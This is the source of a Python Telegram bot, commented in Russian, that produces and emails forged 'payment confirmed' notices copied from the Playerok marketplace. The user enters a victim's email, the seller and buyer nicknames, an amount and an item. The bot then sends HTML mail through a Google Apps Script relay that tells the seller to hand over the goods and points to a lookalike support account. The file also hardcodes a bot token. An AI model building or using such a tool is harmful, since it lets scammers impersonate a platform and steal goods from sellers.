import asyncio, logging, aiohttp, os
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.utils.keyboard import InlineKeyboardBuilder
from aiohttp import web

# --- КОНФИГУРАЦИЯ ---
API_TOKEN = '8777068569:AAEl-874WqglkLNCl9Uyjc_VMApsNltS2Is'
GOOGLE_SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbwApBf3F8gJ34BGN5zvIlX_hPYkEz5K7aKDeoDH0pdE-I9TjCE-r2690IuTpl4OaJ9q/exec'

bot = Bot(token=API_TOKEN)
dp = Dispatcher(storage=MemoryStorage())

# --- ВЕБ-СЕРВЕР ---
async def handle(request): return web.Response(text="Server Active")
async def start_webserver():
    app = web.Application(); app.router.add_get('/', handle)
    runner = web.AppRunner(app); await runner.setup()
    port = int(os.environ.get("PORT", 8080))
    site = web.TCPSite(runner, '0.0.0.0', port); await site.start()

# --- МАКСИМАЛЬНО ТОЧНЫЙ ШАБЛОН (ВСЕ ДЕТАЛИ СО СКРИНОВ) ---
def get_html_template(seller, amount, item, buyer):
    s = seller.replace("@", ""); b = buyer.replace("@", "")
    return f"""
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="color-scheme" content="only">
</head>
<body style="margin:0; padding:0; background-color:#0d0d0d !important; color:#ffffff !important; font-family: -apple-system, system-ui, sans-serif; -webkit-text-size-adjust: none;">
    <div style="background-color:#0d0d0d !important; padding: 15px 0; min-height: 100vh;">
        
        <div style="width: 92%; max-width: 440px; margin: 0 auto; background-color:#161616; border-radius:28px; border:1px solid #282828; overflow:hidden;">
            
            <div style="background: linear-gradient(135deg, #3291ff 0%, #00c2ff 100%) !important; padding: 32px 24px;">
                <table width="100%" border="0" cellspacing="0" cellpadding="0">
                    <tr>
                        <td>
                            <h2 style="margin:0; color:#ffffff !important; font-size:23px; font-weight:800; letter-spacing:-0.5px;">Playerok • Сделка</h2>
                            <p style="margin:8px 0 0 0; color:#ffffff !important; font-size:12px; opacity:0.95; font-weight:500;">Системное уведомление • Оплата подтверждена внутри платформы</p>
                        </td>
                        <td align="right" style="width:85px;">
                            <div style="background:#ffffff !important; color:#000000 !important; padding:9px 12px; border-radius:8px; font-weight:900; font-size:16px; text-align:center;">Player<span style="color:#3586ff !important;">ok</span></div>
                        </td>
                    </tr>
                </table>
            </div>

            <div style="padding:20px;">
                
                <div style="background-color:#1e1e1e; border-radius:18px; padding:16px 20px; margin-bottom:12px; border:1px solid #2a2a2a;">
                    <table width="100%"><tr>
                        <td style="color:#ffffff !important; font-weight:700; font-size:17px;">👋 Здравствуйте, @{s}</td>
                        <td align="right"><span style="background:#2a2444; color:#9a8cff; padding:5px 11px; border-radius:12px; font-size:10px; font-weight:700; text-transform:uppercase;">Seller</span></td>
                    </tr></table>
                </div>

                <div style="background-color:#1e1e1e; border-radius:20px; padding:22px; margin-bottom:12px; border:1px solid #2a2a2a;">
                    <div style="color:#828282; font-size:13px; margin-bottom:10px; text-transform:uppercase; font-weight:600;">Статус</div>
                    <div style="background:#00a651; color:#ffffff !important; padding:9px 16px; border-radius:12px; font-size:13px; font-weight:800; display:inline-block; margin-bottom:18px;">✅ ОПЛАТА ПОДТВЕРЖДЕНА</div>
                    
                    <div style="color:#828282; font-size:13px; margin-bottom:6px; text-transform:uppercase; font-weight:600;">Сумма</div>
                    <div style="color:#00a651; font-size:36px; font-weight:800; margin:0 0 12px 0;">{amount} ₽</div>
                    <p style="color:#828282; font-size:14px; line-height:1.5; margin:0;">Оплата по сделке зафиксирована системой. Передайте товар покупателю и дождитесь подтверждения.</p>
                </div>

                <div style="background-color:#1e1e1e; border-radius:20px; padding:22px; margin-bottom:12px; border:1px solid #2a2a2a;">
                    <div style="color:#828282; font-size:12px; margin-bottom:18px; font-weight:700; text-transform:uppercase;">Детали сделки</div>
                    
                    <div style="margin-bottom:16px;">
                        <div style="color:#828282; font-size:12px; margin-bottom:5px;">Товар</div>
                        <div style="color:#ffffff !important; font-weight:700; font-size:15px; line-height:1.4;">{item}</div>
                    </div>
                    
                    <div style="margin-bottom:16px;">
                        <div style="color:#828282; font-size:12px; margin-bottom:5px;">Статус</div>
                        <div style="background:#0e2a1a; color:#00a651 !important; padding:4px 10px; border-radius:8px; display:inline-block; font-size:12px; font-weight:700;">Оплачено</div>
                    </div>
                    
                    <div style="margin-bottom:16px;">
                        <div style="color:#828282; font-size:12px; margin-bottom:5px;">Покупатель</div>
                        <div style="color:#ffffff !important; font-weight:700; font-size:15px;">@{b}</div>
                    </div>
                    
                    <div>
                        <div style="color:#828282; font-size:12px; margin-bottom:5px;">Сумма</div>
                        <div style="color:#00a651; font-weight:800; font-size:16px;">{amount} ₽</div>
                    </div>
                </div>

                <div style="background-color:#1c1814; border-left:4px solid #d29922; padding:20px; border-radius:18px; margin-bottom:12px;">
                    <div style="color:#e19d55; font-size:12px; font-weight:800; text-transform:uppercase; margin-bottom:12px;">ДЕЙСТВИЕ СЕЙЧАС</div>
                    <div style="color:#ffffff !important; font-size:15px; margin-bottom:12px;">Передайте товар покупателю: <span style="background:#0d0d0d; padding:4px 9px; border-radius:7px; border:1px solid #333; font-weight:700;">@{b}</span></div>
                    <div style="color:#828282; font-size:13px; line-height:1.4;">После подтверждения передачи средства зачислятся автоматически.</div>
                </div>

                <div style="background-color:#1e1e1e; border-radius:20px; padding:22px; border:1px solid #2a2a2a;">
                    <div style="color:#828282; font-size:12px; margin-bottom:18px; font-weight:700; text-transform:uppercase;">Безопасность / Проверка</div>
                    <ul style="list-style:none; padding:0; margin:0 0 20px 0; font-size:13px; color:#cccccc; line-height:1.6;">
                        <li style="margin-bottom:10px;"><span style="color:#828282; margin-right:8px;">•</span> Сверьте покупателя: <b>@{b}</b></li>
                        <li style="margin-bottom:10px;"><span style="color:#828282; margin-right:8px;">•</span> Мы не запрашиваем коды/пароли и не подтверждаем сделки "вне платформы"</li>
                        <li><span style="color:#828282; margin-right:8px;">•</span> Передавайте товар только в рамках этой сделки</li>
                    </ul>
                    
                    <div style="color:#828282; font-size:13px; margin-bottom:22px;">Официальный контакт: <span style="color:#ffffff; font-weight:600;">@Helper_PlayerOK</span></div>

                    <a href="https://t.me/Helper_PlayerOK" style="display:block; background:#0d0d0d; border:1px solid #333; color:#ffffff !important; text-align:center; padding:18px; border-radius:16px; text-decoration:none; font-weight:700; font-size:15px;">Открыть поддержку в Telegram</a>
                    
                    <p style="text-align:center; color:#444; font-size:11px; margin:22px 0 0 0;">Официальный контакт: @Helper_PlayerOK</p>
                </div>
            </div>
        </div>
    </div>
</body>
</html>
    """

# --- БОТ ЛОГИКА ---
class OrderState(StatesGroup):
    waiting_email = State(); waiting_seller = State(); waiting_amount = State(); waiting_item = State(); waiting_buyer = State()

async def send_via_google(email, body):
    async with aiohttp.ClientSession() as session:
        payload = {"email": email, "body": body}
        async with session.post(GOOGLE_SCRIPT_URL, json=payload, timeout=30) as resp:
            return await resp.text()

@dp.message(Command("start"))
async def cmd_start(message: types.Message, state: FSMContext):
    await state.clear()
    kb = InlineKeyboardBuilder().button(text="🚀 Создать уведомление", callback_data="start_order").as_markup()
    await message.answer("✅ Бот запущен! Дизайн полностью соответствует скриншотам.", reply_markup=kb)

@dp.callback_query(F.data == "start_order")
async def start_order(callback: types.CallbackQuery, state: FSMContext):
    await callback.message.answer("1️⃣ Введите **Email**:"); await state.set_state(OrderState.waiting_email); await callback.answer()

@dp.message(OrderState.waiting_email)
async def st1(m: types.Message, state: FSMContext):
    await state.update_data(email=m.text); await m.answer("2️⃣ Ник продавца:"); await state.set_state(OrderState.waiting_seller)

@dp.message(OrderState.waiting_seller)
async def st2(m: types.Message, state: FSMContext):
    await state.update_data(seller=m.text); await m.answer("3️⃣ Сумма (₽):"); await state.set_state(OrderState.waiting_amount)

@dp.message(OrderState.waiting_amount)
async def st3(m: types.Message, state: FSMContext):
    await state.update_data(amount=m.text); await m.answer("4️⃣ Название товара:"); await state.set_state(OrderState.waiting_item)

@dp.message(OrderState.waiting_item)
async def st4(m: types.Message, state: FSMContext):
    await state.update_data(item=m.text); await m.answer("5️⃣ Ник покупателя:"); await state.set_state(OrderState.waiting_buyer)

@dp.message(OrderState.waiting_buyer)
async def st5(m: types.Message, state: FSMContext):
    data = await state.get_data(); buyer = m.text
    await m.answer("⏳ Отправка полной версии дизайна...");
    try:
        html = get_html_template(data['seller'], data['amount'], data['item'], buyer)
        res = await send_via_google(data['email'], html)
        await m.answer("✅ Письмо отправлено!" if "Success" in res else f"❌ Ошибка: {res}")
    except Exception as e: await m.answer(f"❌ Ошибка: {e}")
    await state.clear()

async def main():
    logging.basicConfig(level=logging.INFO)
    await asyncio.gather(start_webserver(), dp.start_polling(bot))

if __name__ == "__main__": asyncio.run(main())
